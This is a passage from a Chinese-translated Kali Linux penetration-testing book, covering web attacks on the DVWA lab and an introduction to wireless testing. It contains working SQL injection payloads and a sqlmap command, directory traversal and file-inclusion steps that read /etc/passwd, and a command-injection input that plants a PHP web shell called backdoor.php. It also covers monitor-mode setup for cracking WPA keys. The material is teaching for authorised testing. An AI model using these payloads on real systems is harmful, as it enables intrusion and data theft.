![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/207d7906-063a-4a70-a8b1-b9d6337e13f8.jpg)

`%`表示 mod 并将返回`false`。但我们添加了 OR 运算符。因此，由于查询的第一部分将返回`false`（因为`%`），OR 将强制其执行第二部分，`'1'='1`，这是`true`。因此，因为查询运行的一切，对于表中的每条记录来说，它总是`true`，SQL 打印出表中的所有记录。

以下是您可以尝试的其他查询：

+   获取用于在 Web 应用程序和数据库之间连接的帐户的用户名：`%' or 0=0 union select null, user() #`

+   从中获取我们一直在提取数据的当前数据库：`%' or 0=0 union select null, database() #`

+   显示信息模式表：`information_schema`表是一个存储有关所有其他数据库的信息的数据库；`%' and 1=0 union select null, table_name from information_schema.tables #`

+   显示数据库表：使用上一个查询的数据，我们可以找出表是什么：`%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#`

# 自动化 SQL 注入

现在我们了解了 SQL 注入的外观，让我们看一些可以自动化此过程的工具。

# sqlmap

sqlmap 是 Kali 内置的工具，可用于识别和利用 SQLi 漏洞。在这个例子中，我们将使用 Burp Suite 收集一些数据，然后将其提供给`sqlmap`进行工作。

启动 Burp Suite 并设置浏览器通过其代理路由所有流量。确保拦截是打开的。转到 DVWA 应用程序上的 SQL 注入页面并输入用户 ID；在这种情况下，我将输入`1`。

Burp 会捕获请求。将其转发直到请求完成。您应该在网页上看到您的结果。转到目标选项卡，选择 DVWA IP（在我的情况下是`192.168.0.19`），并使用箭头向下浏览结果，按照 URL 路径，`http://192.168.0.19/dvwa/vulnerabilities/sqli/`（您可以在浏览器的地址栏中确认）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/0ec95d23-9cdb-47f4-8baa-e4461a05bc4f.jpg)

选择状态为`200`（HTML 代码为`200`）的请求：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/762ccbec-2e12-4090-ab03-6e4ac68f9677.jpg)

在请求选项卡中，我们得到了我们需要的信息-Web 应用程序发送的实际请求（引用者），它在第一行中：`/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit`，以及我们得到的 PHP 会话 ID 或 Cookie：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/924facf8-48fe-429e-bb1e-7b6d6412c9d4.jpg)

有了这些数据，让我们打开终端并输入以下内容来获取数据库用户，就像我们用手动步骤一样：

```
sqlmap -u "http://192.168.0.19/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=fb89mhevcus9oq1a1f2s6q3ss4; security=low" -b --current-db --current-user
```

这是一行没有断点的`--cookie`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/4e54b488-4dda-4eee-b4de-1fda3b1bfddc.jpg)

+   `-u`：用于从 Burp 获取的目标 URL

+   `--cookie`：用于从 Burp 捕获的 cookie 信息

+   `-b`：显示数据库横幅

+   `--current-db`：获取当前数据库

+   `--current-user`：获取当前数据库的当前用户：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/3e6e8774-b7cb-4834-90c3-9e9a9d215982.jpg)

在测试过程中会提示您，您可以安全地按下*Enter*键接受默认设置。只有一个提示，我没有使用默认设置，纯粹是为了节省时间：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/86a8851c-f0ba-4c31-91fc-2e219323a931.jpg)

最后，我们得到了结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/888d2a28-948f-4e74-9f54-d295f46cb8b6.jpg)

我们得到了有关运行数据库的操作系统（`Ubuntu 10.04`），服务器端技术（`PHP 5.3.2 和 Apache 2.2.14`），数据库（`MySQL`），当前数据库（`dvwa`）和当前用户（`dvwa`）的信息。

要获取`sqlmap`提供给您的所有选项的列表，只需在终端中键入`sqlmap -h`，如果您想要更高级的选项，输入`sqlmap --hh`。

# 命令执行，目录遍历和文件包含

命令注入是一种攻击类型，其主要目标是使系统命令由易受攻击的应用程序的主机操作系统执行。当不安全的用户输入从应用程序传递到系统 shell 时，这些类型的攻击是可能的。提供的命令以应用程序的特权级别执行，例如，Web 服务器可能以`www-data`用户或 Apache 用户而不是 root 用户运行。

目录遍历是指服务器允许攻击者读取正常 Web 服务器目录之外的文件或目录。

文件包含漏洞是一种允许攻击者通过利用易受攻击的包含过程将文件包含到 Web 服务器的漏洞。例如，当页面接收文件路径作为输入并且此输入未经适当清理时，就会发生这种类型的漏洞，从而允许攻击者注入目录遍历字符（`../`）。

文件包含，目录遍历和命令注入都是一起工作的攻击向量。

# 目录遍历和文件包含

让我们开始测试，看看我们是否可以让 Web 应用程序跳转到上一级目录。

我们将再次进入 DVWA 应用程序。登录并从左侧菜单导航到文件包含页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/960d200a-726a-4737-9e48-a4058627a381.jpg)

在浏览器的地址栏中，您应该看到`<IP 地址>/dvwa/vulnerabilities/fi/?page=include.php`。让我们将`include.php`更改为`index.php`，看看会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/7d396c69-c85c-4608-9ea5-fe698301e84f.jpg)

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/63e95547-5f9f-461f-baa3-a64416f63e6c.jpg)

什么都没有发生，这表明在这个目录中没有`index.php`。但是我们知道`index.php`是存在的，它在`/dvwa`目录中。我们是怎么知道的呢？当我们使用 Burp Suite 来破解`login.php`页面的凭据时，我们看到成功登录会将用户重定向到`index.php`。您在浏览器中看不到`index.php`，因为`index.php`是 PHP 的默认根页面（ASP 的`default.asp`），因此默认情况下不会显示它。要测试，您只需在 DVWA 菜单中点击主页按钮，然后在`/dvwa`之后输入`/index.php`。这将带您到同样的主页。

再次导航到文件包含页面。查看 URL，我们看到我们目前在`/dvwa/vulnerability/fi/`，这是从我们的根目录`dvwa`向下两个目录。在浏览器的地址中，删除`include.php`，这次用`../../index.php`替换它。按下*Enter*，让我们看看会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/a7c902c8-f055-45ec-9b6c-6a88fc7d9c99.jpg)

果然，它把我们带到了主页。太好了。我们成功地遍历了 Web 服务器的目录结构，并且，由于我们使用了系统中的一个文件，我们现在知道**本地文件包含**（**LFI**）是可能的。

根据我们之前使用`sqlmap`和`nikto`的结果，我们知道这个`apache`服务器正在运行的操作系统是 Linux（Ubuntu）。在 Linux 中，默认情况下，`apache`将其文件存储在`/var/www/html/`目录中。Linux 将基本用户信息存储在`/etc/passwd`文件中，并将散列用户密码存储在`/etc/shadow`文件中。有了这个知识，让我们尝试改变目录以查看`/etc/passwd`文件。

再次在文件包含页面上，删除`include.php`，输入`../../../../../../etc/passwd`。

`../../../../../../`将我们带到了`/var/www/html/dvwa/vulnerability/fi/`，然后到了`/`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/d6487a78-666a-4aee-9284-022051392e82.jpg)

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/022de721-b309-411c-a6ae-b65448ed2bc0.jpg)

我们成功地向上改变了六个目录，然后向下改变了一个目录到`/etc`，获得了对`passwd`文件的访问。我们看到的是`passwd`文件的内容。

这是它复制到文本文件并清理后的截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/051c5396-7aab-44f8-96b2-0c3acdd40cea.jpg)

冒号后的`x`表示这个帐户有密码，并且它以散列形式存储在`/etc/shadow`文件中。

知道我们可以遍历目录并且 LFI 是可能的，现在让我们尝试一下**远程文件包含**（**RFI**）攻击。

我们的下一步是将一个文件从远程服务器（我们的 Kali 系统）传递到我们的目标系统。在终端中，输入以下内容：

```
service apache2 start
```

这启动了我们系统上的`apache` Web 服务器。您可以通过转到浏览器，输入您的系统 IP，然后会看到默认的`apache` HTML 页面来测试它。

回到 DVWA 应用程序，在文件包含页面导航。在地址栏中，用您的`webserver/index.html`的路径替换`include.php`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/58b45f1e-0414-4116-b741-1659f157f4b1.jpg)

它成功地打开了`index.html`，这是托管在我们的 Web 服务器上的。在这个系统上可能发生 RFI：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/e0204f7d-5e25-4a31-a112-8d41eed6f097.jpg)

# 命令执行

命令注入漏洞允许攻击者将命令注入到验证不足的用户输入中。这个输入以某种形式被系统 shell 使用，在这个过程中，注入的命令在系统上被执行。

有一种情况是，您可能会发现这是一个应用程序，它接受用户输入，例如用户名或电子邮件地址，并在系统上创建一个用于存储用户数据、文件上传等的文件夹。

在我们的目标系统 DVWA 中，有一个页面用于演示这个缺陷，通过利用传递给系统 ping 命令的用户输入。让我们再次登录到 OWASP Broken Apps VM 上的 DVWA，并从左侧菜单中选择命令注入：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/b3b29310-7227-4a21-9efb-c8409a910a60.jpg)

如前所述，这个输入被传递给 ping 命令，应该是一个 IP 地址。我们可以通过传递`127.0.0.1`来确认这一点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/67be9982-8445-40b7-8f7e-83d998f88049.jpg)

我们得到了预期的结果。现在，让我们尝试将另一个命令传递到这个输入中。我们知道这个应用程序正在 Linux 上托管。在 Linux 中，我们可以使用`&&`来连接命令。

使用`&&`，前一个命令必须成功完成，然后才能执行下一个命令。`;`将执行命令，无论前一个是否成功完成。让我们尝试一个基本的`ls`命令。在输入框中，输入`127.0.0.1; ls`，然后点击提交：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/92f93794-3eab-4af8-a70c-49476382b33b.jpg)

现在我们已经确认，在处理之前没有验证输入，因为 ping 统计后的行显示了当前目录的文件。我们可以扩展这一点，获取我们所在的当前目录以及执行命令的用户是谁。输入`127.0.0.1`；`pwd`；`whoami`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/969d3e82-1248-4e80-b20a-3e820bec1624.jpg)

从我们的结果中，我们看到我们目前在`/owaspbwa/dvwa-git/vulnerabilities/exec`目录中，并且我们正在以`www-data`用户的身份执行命令。现在让我们尝试打印文件的内容，特别是`/etc/passwd`文件。在输入框中，输入`127.0.0.1`和`cat /etc/paswd`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/dd2b0c08-949f-46af-ab68-60bb8f2ac836.jpg)

这个片段应该看起来像我们之前 LFI 的结果。

让我们再做一件事。让我们在目录中创建一个文件，以便以后可以参考这个文件来执行命令。输入`127.0.0.1`和`echo “<?php system(\$_GET[‘cmd’]) ?>” > backdoor.php`。这应该创建一个名为`backdoor`的 PHP 文件，里面的 PHP 代码应该是`system (\$_GET[‘cmd’])`。

现在，在浏览器中导航到`<ip address>/dvwa/vulnerabilities/exec/backdoor.php`。

页面加载了，但是没有显示任何内容。这是因为我们还没有传递任何命令。看看我们输入的内容，在单引号中我们有`cmd`。这是我们的变量，用于存储我们想要执行的命令，并将其传递给系统执行。要执行一个命令，在地址栏中的`backdoor.php`后面，输入`?cmd=`，然后输入你的命令。我将使用`ls`作为一个基本演示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/eed2b93b-7672-43f3-86a4-03ef5d90ad26.jpg)

从这一点开始，可以���挥你的想象力，尝试不同的可能性。诚然，演示需要一些工作，但你可以随时查看源代码进行清理：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/aa4904c9-ae34-46bf-8804-5e1c3f77859a.jpg)

我想补充一点，你可以使用 Burp Suite 中的 Repeater 来执行这些步骤，你也可以将 Burp Suite 与`sqlmap`和 Metasploit 一起使用来获得一个 meterpreter shell。

# 摘要

在本章中，我们看了一些用于 Web 应用程序测试的主要工具，通过延伸，云应用程序也是如此，因为它们建立在相同的协议上并使用许多相同的平台。

正如你所看到的，这些漏洞有一个共同的根本原因，即用户输入没有经过净化或验证，以确保所需的数据被用于处理。此外，对一个漏洞的利用可以允许另一个漏洞被利用（例如目录遍历到文件包含）。

我们使用 OWASP ZAP、Nikto、`sqlmap`和 Burp Suite 来识别可能的漏洞，测试它们并利用它们。然而，Kali 还配备了许多其他工具，可以用来进行这些测试，许多工具可以一起使用。

Burp Suite 和 OWASP ZAP 特别是非常强大的独立工具，可以完成我们所看到的一切，甚至一些我们没有看到的东西。我们甚至可以使用它们进行目录遍历和文件包含测试。

一些其他要看的工具如下：

+   Commix（命令注入漏洞工具）

+   DirBuster（Web 服务器目录暴力破解工具）

+   Recon-NG（网络侦察工具）

+   Sqlninja（Microsoft SQL 注入工具）

在下一章中，我们将看一下无线网络分析，使用各种工具攻击网络以获取访问权限，并保持对网络的访问的方法。我们甚至会看一下设置恶意双子（Rogue AP）的初始步骤。

# 进一步阅读

有许多资源可供了解更多关于 Web 和云应用程序测试的信息。以下是一些资源：

+   *Kali Linux Web 渗透测试食谱-第二版*（Packt Publishing）

+   OWASP 十大 2017 年- 十大最关键的 Web 应用安全风险：[`www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf`](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)

+   OWASP 基金会：[`www.owasp.org/index.php/Main_Page`](https://www.owasp.org/index.php/Main_Page)


# 第十一章：无线渗透测试

在我们之前的讨论中，我们已经研究了连接到有线网络时涉及的渗透测试技术。这包括内部**局域网**（**LAN**）和在公共互联网上进行的 Web 应用程序评估等技术。值得关注的一个重点是无线网络。无线网络是无处不在的，在商业、政府、教育和住宅环境中都得到部署。因此，渗透测试人员应确保这些网络具有适当数量的安全控制，并且没有配置错误。

在本章中，我们将讨论以下主题：

+   **无线网络**：在这个主题中，我们将讨论管理客户端（如笔记本电脑和平板电脑）如何认证和与无线网络接入点通信的基础协议和配置。

+   **侦察**：就像我们在有线连接上进行的渗透测试一样，在 Kali Linux 和其他工具中可以添加和利用工具来识别潜在的目标网络，以及我们在攻击过程中可以利用的其他配置信息。

+   **认证攻击**：与试图破坏远程服务器不同，我们将讨论的攻击是围绕获取对无线网络的认证访问。一旦认证，我们就可以连接，然后实施之前研究过的工具和技术。

+   **认证后该怎么做**：在这里，我们将讨论在认证机制被破解后可以采取的一些行动。这些包括针对接入点的攻击以及如何绕过无线网络中实施的常见安全控制。还将讨论嗅探无线网络流量以获取凭证或其他信息。

对无线网络渗透测试的深入了解变得越来越重要。技术正在迅速采用**物联网**（**IoT**）的概念，旨在将更多用于舒适和便利的设备移至互联网。无线网络将推动这一进展。

因此，将需要更多这些网络，这对应着攻击面的增加。客户和组织将需要了解风险以及攻击者如何攻击这些系统。

# 技术要求

在本章中，使用了两种不同的 USB 天线。第一种是 TP-LINK TL-WN722N 无线 N150 高增益 USB 适配器，另一种是 Alfa AWUSO36NH 高增益 USB 无线 G/N 长距离 Wi-Fi 网络适配器。这两种产品都可以在商业市场上找到。有关支持的无线天线和芯片组的更多信息，请参考以下网站：[`aircrack-ng.org/doku.phpid=compatibility_drivers&DokuWiki=090ueo337eqe94u5gkjo092di6#which_is_the_best_card_to_buy`](http://aircrack-ng.org/doku.phpid=compatibility_drivers&DokuWiki=090ueo337eqe94u5gkjo092di6#which_is_the_best_card_to_buy)。

# 无线网络

无线网络遵循协议和配置，方式与有线网络类似。无线网络利用无线电频谱频率在接入点和连接的网络之间传输数据。对于我们的目的，**无线局域网**（**WLANs**）与标准**局域网**（**LANs**）有很多相似之处。渗透测试人员的主要重点是识别目标网络并获取访问权限。

# 802.11 概述

统治无线网络的最高标准是 IEEE 802.11 标准。这一套规则最初是为了方便使用和快速连接设备而开发的。对于最初在 1997 年发布的标准，安全性方面的担忧并未得到解决。从那时起，这些标准已经进行了许多修订；其中对无线网络产生重大影响的第一个是 802.11b。这是最广泛接受的标准，于 1999 年发布。

由于 802.11 标准使用无线电信号，特定地区有不同的法律和法规适用于无线网络的使用。尽管如此，802.11 标准及其相关修订中只内置了少数几种安全控制类型。

# 有线等效隐私标准

**Wired Equivalent Privacy**（**WEP**）标准是与 802.11 标准一起开发的第一个安全标准。WEP 首次部署于 1999 年，与第一个广泛采用的 802.11 版本一起，旨在提供与有线网络上发现的相同数量的安全性。这是通过使用 RC4 密码来提供保密性和使用 CRC32 来提供完整性来实现的。

连接到 WEP 网络的认证是通过使用 64 位或 128 位密钥来完成的。64 位密钥是通过输入一系列 10 个十六进制字符来派生的。这些初始的 40 位与 24 位**Initialization Vector**（**IV**）相结合，形成 RC4 加密密钥。对于 128 位密钥，104 位密钥或 26 个十六进制字符与 24 位 IV 相结合，创建 RC4 密钥。

连接到 WEP 无线网络的认证是一个四阶段的过程：

1.  客户端向 WEP 接入点发送认证请求。

1.  WEP 接入点向客户端发送明文消息。

1.  客户端获取输入的 WEP 密钥，并加密接入点传输的明文消息。客户端将其发送到接入点。

1.  接入点使用自己的 WEP 密钥解密客户端发送的消息。如果消息被正确解密，客户端就被允许连接。

正如之前所提到的，WEP 并不是以消息保密性和完整性为中心设计的。因此，WEP 实施存在两个关键漏洞。首先，CRC32 算法并不是用于加密，而是用作错误的校验和。其次，RC4 容易受到所谓的初始化向量攻击。IV 攻击是可能的，因为 RC4 密码是流密码，因此相同的密钥不应该被两次使用。在繁忙的无线网络中，24 位密钥太短而无法使用。在大约 50%的情况下，相同的 IV 将在 5000 次使用内在无线通信频道中使用。这将导致碰撞，从而可以反转 IV 和整个 WEP 密钥。

由于安全漏洞，WEP 从 2003 年开始逐步淘汰，以更安全的无线实现为代价。因此，您可能不会在野外看到 WEP 的实施，但商业市场上仍有出售启用 WEP 的接入点。此外，您可能会遇到仍在使用此协议的传统网络。

# Wi-Fi Protected Access（WPA）

随着 WEP 无线网络实现的安全漏洞显而易见，802.11 标准进行了更新，以在无线网络的保密性和完整性周围应用更高程度的安全性。这是通过设计**Wi-Fi Protected Access**（**WPA**）标准来实现的，该标准首次在 2003 年的 802.11i 标准中实施。WPA 标准在 2006 年进一步升级为 WPA2，从而成为 Wi-Fi Protected Access 网络的标准。WPA2 有三个不同的版本，每个版本都使用自己的认证机制：

+   **WPA-Personal**：这种 WPA2 实现通常在住宅或中小型企业环境中找到。WPA2 使用预共享密钥，该密钥由口令和无线网络的广播**服务集标识符**（**SSID**）的组合派生而来。这个口令由用户配置，可以是 8 到 63 个字符的任何内容。然后，这个口令与 SSID 一起进行盐处理，再通过 SHA1 哈希算法的 4,096 次交互。

+   **WPA-Enterprise**：WPA/WPA2 的企业版本使用 RADIUS 认证服务器。这允许对用户和设备进行认证，并严重减少了暴力破解预共享密钥的能力。

+   **Wi-Fi Protected Setup (WPS)**：这是一种更简单的认证方式，它使用 PIN 码而不是密码或口令。最初开发为连接设备到无线网络的更简单方式，我们将看到这种实现如何被破解，揭示出 PIN 码和无线网络实现中使用的口令。

为了我们的目的，我们将专注于测试 WPA-Personal 和 WPS 的实现。在 WPA-Personal 的情况下，认证和加密是通过四路握手来处理的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/56b356b7-1e3c-4731-8c29-9f7988215e4d.png)

1.  接入点向客户端发送一个随机数，称为**ANonce**。

1.  客户端创建另一个称为**SNonce**的随机数。SNonce、ANonce 和用户输入的口令组合在一起，创建了所谓的**消息完整性检查**（**MIC**）。MIC 和 SNonce 被发送回接入点。

1.  接入点将 ANonce、SNonce 和预共享密钥进行哈希处理，如果匹配，则对客户端进行认证。然后向客户端发送一个加密密钥。

1.  客户端确认加密密钥。

WPA-Personal 实现中存在两个关键的漏洞，我们将重点关注：

+   **弱预共享密钥**：在 WPA-Personal 实现中，用户配置接入点的设置。通常，用户会配置一个简短、易记的口令。正如之前所示，我们能够嗅探到接入点和客户端之间的流量。如果我们能够捕获到四路握手，我们就有了反向破解口令并认证到网络所需的所有信息。

+   **WPS**：Wi-Fi Protected Setup 是终端用户通过 PIN 码将设备连接到无线网络的用户友好方式。打印机和娱乐设备通常会使用这项技术。用户只需在启用 WPS 的接入点上按下一个按钮，然后在启用 WPS 的设备上按下相同的按钮，就可以建立连接。缺点是，这种认证方式是通过 PIN 码完成的。这个 PIN 码可以被反向破解，不仅可以揭示 WPS PIN 码，还可以揭示无线口令。

# 无线网络侦察

与渗透测试局域网或公共互联网一样，我们需要进行侦察，以识别我们的目标无线网络。与拥有网络连接不同，我们还必须小心确保我们不会攻击未经授权测试的网络。当讨论无线渗透测试时，这成为一个重要问题，因为你经常会发现许多无线网络与目标网络混在一起。特别是在我们的目标组织及其相关网络位于办公大楼或公园的情况下。

# 天线

开始无线渗透测试时的一个关键考虑因素是天线的选择。虚拟机和笔记本电脑通常没有适当的无线网卡和天线来支持无线渗透测试。因此，您将不得不获取一个受支持的外部天线。大多数这些天线可以在网上以适中的价格轻松购买。

# Iwlist

Kali Linux 有几个工具可用于识别无线网络；其中一个基本工具是`iwlist` Linux 命令。此命令列出了无线卡范围内可用的无线网络。打开命令提示符，输入以下内容：

```
    # iwlist wlan0 scan 
```

以下屏幕截图显示了输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/13db4bc9-cffa-4daf-abe4-42374b5cdfdb.png)

虽然是一个简单的工具，但它为我们提供了一些有用的信息。这包括无线访问点的 BSSID 或 MAC 地址（这将在以后变得重要），认证和加密类型以及其他信息。

# Kismet

Kismet 是一个组合无线扫描仪、IDS/IPS 和数据包嗅探器，它已安装在 Kali Linux 2.0 上。Kismet 是用 C++编写的，提供了一些通常在纯命令行工具中找不到的附加功能。要启动 Kismet，您可以导航到应用程序|无线攻击|Kismet，或在命令提示符中键入以下内容：

```
    # kismet 
```

命令执行后，您将被带到一个窗口。有不同的颜色方案可用，初始消息将验证您是否能在终端中看到 Kismet：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/6d966b5e-1d06-4c8b-8ae0-ee31f7954b84.png)

如果您没有问题看到终端，请单击“是”。

Kismet 需要有一个用于分析的来源。这将是您 Kali Linux 安装上的无线接口。如果您不确定，请在命令提示符中键入`ifconfig`；以 WLAN 开头的接口是您的无线接口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/e99717fd-99c5-4f3f-8bbe-c1b6c28fbe02.png)

按*Enter*键表示“是”。

下一个屏幕允许您输入 Kismet 用于扫描的接口。在下面的屏幕截图中，我们输入`wlan0`，因为这是我们正在使用的接口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/30f1b06a-22b6-48d4-9cd4-235bec2cebc6.png)

按*Enter*键添加接口。此时，Kismet 将开始收集无线访问点。这包括每个访问点正在使用的 BSSID 和信道：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/2f22b3c1-e248-42c9-81d5-ea570fc775d0.png)

从 Kismet 的输出中，您可以开始了解您的系统可见的无线网络。从这里开始，尝试识别那些无线访问点或网络，这些网络是您渗透测试的一部分。

# WAIDPS

另一个有用的命令行工具是 WAIDPS 工具，用于无线渗透测试。虽然被宣传为无线网络入侵检测平台，但这个 Python 脚本对于收集有关无线网络和客户端的信息非常有用。要使用 WAIDPS，只需从[`github.com/SYWorks/waidps`](https://github.com/SYWorks/waidps)的网站下载`WAIDPS.py` Python 脚本。

下载后，将脚本放入任何目录，然后使用以下命令运行它：

```
    # python waidps.py
```

命令执行后，您将被带到一个屏幕，脚本将通过配置运行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/d4466907-0f02-406d-aa69-dd7655eed71b.png)

WAIDPS 具有一个可选功能，它将无线访问点的 MAC 地址与已知制造商的列表进行比较。如果您知道特定目标为其访问点使用了特定制造商，则此功能非常有用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ac8c31d1-d8a3-4c13-abda-f700c7d5ffb1.png)

一旦初始配置运行，WAIDPS 将提供一个范围内的访问点和无线网络列表。此外，还有有关正在使用的加密类型以及认证机制的信息。另一个很好的信息是 PWR 或功率指示器。这表示特定访问点信号的强度。数字越接近零，信号越强。如果信号比您想要的要弱，这表明您可能需要更靠近实际的访问点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/22323310-7643-4ec2-9c6d-2c95d84946e7.png)

除了识别无线访问点外，WAIDPS 还具有扫描可能启用了无线但未与访问点关联的客户端的能力。如果您需要伪造一个看似来自合法客户端的 MAC 地址，这些信息可能会很有用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/054bd279-1104-4708-9684-0a5a4216cf39.png)

# 无线测试工具

Kali Linux 预装了许多命令行和基于 GUI 的工具。这些工具可以用来将我们的网络接口转换为网络监视器，捕获流量，并反向验证身份验证密码。其中第一个工具是 Aircrack-ng，它是一套工具。此外，我们将研究一些其他命令行和 GUI 工具，涵盖了无线渗透测试所涉及的全部任务。

# Aircrack-ng

Aircrack-ng 是一套工具，允许渗透测试人员测试无线网络的安全性。该套件包括执行以下与无线渗透测试相关任务的工具：

+   **监控**：这些工具专门设计用于捕获流量以供以后分析。我们将更深入地了解 Aircrack-ng 工具捕获无线流量的能力，我们可以将其用于其他第三方软件，如 Wireshark，进行检查。

+   **攻击**：这些工具可用于攻击目标网络。它们包括允许进行去认证攻击和重放攻击的工具，这些攻击利用了 Aircrack-ng 进行数据包注入的能力，Aircrack-ng 实际上将数据包发送到无线数据流中，既发送到客户端又发送到访问点，作为攻击的一部分。

+   **测试**：这些工具允许测试诸如无线网卡之类的硬件的无线功能。

+   **破解**：Aircrack-ng 工具集还具有破解 WEP、WPA 和 WP2 中发现的无线预共享密钥的能力。

除了命令行工具外，Aircrack-ng 还用于许多基于 GUI 的工具。对 Aircrack-ng 的工作原理有扎实的了解将为我们稍后在本章中探讨的其他工具的使用提供坚实的基础。

# WPA 预共享密钥破解

现在我们将使用 Aircrack-ng 套件的工具来攻击 WPA2 无线网络。该过程涉及识别我们的目标网络，捕获四路握手，然后利用一个字典来暴力破解与无线网络的 SSID 相结合的密码，即预共享密钥。通过破解密码，我们将能够对目标无线网络进行身份验证：

1.  确保您已插入无线网络卡，并且它正常工作。为此，请在命令行中输入以下命令：

```
    # iwconfig
```

该命令应输出类似于以下屏幕截图的内容。如果您没有看到无线接口，请确保它已正确配置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/efe691cc-680d-40cd-85b0-d92879df6338.png)

在这里，我们已经将我们的无线接口标识为`wlan0`。如果您有多个接口，您可能也会看到`wlan1`。在进行这些测试时，请确保您使用的是正确的接口。

1.  Aircrack-ng 套件中我们将使用的第一个工具是`airmon-ng`。这个工具允许我们将无线网络卡切换到所谓的监视模式。这很像将网络接口放入混杂模式。这使我们能够捕获比普通无线网络卡看到的更多的流量。要找出`airmon-ng`中可用的选项，输入以下命令：

```
    # airmon-ng -h
```

这将产生以下结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/01c3fe6b-030c-452d-815f-e5b6cafcabcd.png)

要将无线网络卡切换到监视模式，输入以下命令：

```
    # airmon-ng start wlan0
```

如果成功，我们会看到这个：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/f5c1d4b2-b3e6-4663-b3cd-73c0a1dec5c7.png)

如果我们再次使用`iwconfig`检查接口，我们会看到我们的接口也已经改变了：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/515e1605-246e-409a-91e3-f83dc52575c9.png)

有时会有干扰将无线卡放入监视模式的进程。当执行`airmon-ng start wlan0`命令时，可能会看到以下消息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/f7250e26-c88e-424f-b288-65846659b4fc.png)

在这种情况下，有三个可能干扰监视模式下无线卡的进程。在这种情况下，我们运行以下命令：

```
    # airmon-ng check kill

```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/4a76d2c1-7fcb-42bf-bb7d-cc17c46782e5.png)

此时，执行以下命令将允许我们继续：

```
    # pkill dhclient
    #pkill wpa_supplicant

```

这会终止可能干扰`airmon-ng`的进程。要重新启用这些进程，在使用 Aircrack-ng 工具完成后，输入以下两个命令到命令行中：

```
    # service networking start
    # service network-manager start 
```

如果仍然有任何问题，可以重新启动 Kali Linux，这些服务将被重新启用。

在下一步中，我们需要扫描我们的目标网络。在上一节中，我们讨论了一些必要的侦察工作来识别潜在的目标网络。在这种情况下，我们将使用一个名为`airodump-ng`的工具来识别我们的目标网络，以及确定它正在使用的 BSSID 和正在广播的信道。要访问`airodump-ng`的选项，输入以下命令到命令提示符中：

```
    # airodump-ng -help
```

这将产生以下部分输出：

